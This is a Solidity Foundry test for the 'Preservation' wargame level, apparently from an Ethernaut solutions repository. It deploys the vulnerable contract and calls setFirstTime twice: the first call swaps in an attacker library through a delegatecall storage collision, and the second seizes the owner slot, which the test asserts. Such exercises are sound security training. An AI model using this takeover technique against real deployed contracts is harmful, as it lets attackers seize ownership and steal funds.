// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "forge-std/Test.sol";
import "instances/16_Preservation.sol";
import "contracts/16_Preservation.sol";

contract AttackerPreservationTest is Test {
    function testPreservation() external {
        vm.startPrank(address(1));
        LibraryContract tzLib1 = new LibraryContract();
        LibraryContract tzLib2 = new LibraryContract();
        AttackerPreservation attackerPreservation = new AttackerPreservation();
        Preservation preservation = new Preservation(address(tzLib1), address(tzLib2));
        vm.stopPrank();

        assertEq(address(tzLib1), preservation.timeZone1Library());
        preservation.setFirstTime(uint256(address(attackerPreservation)));
        assertEq(address(attackerPreservation), preservation.timeZone1Library());

        assertEq(address(1), preservation.owner());
        preservation.setFirstTime(uint256(msg.sender));
        assertEq(msg.sender, preservation.owner());
    }
}
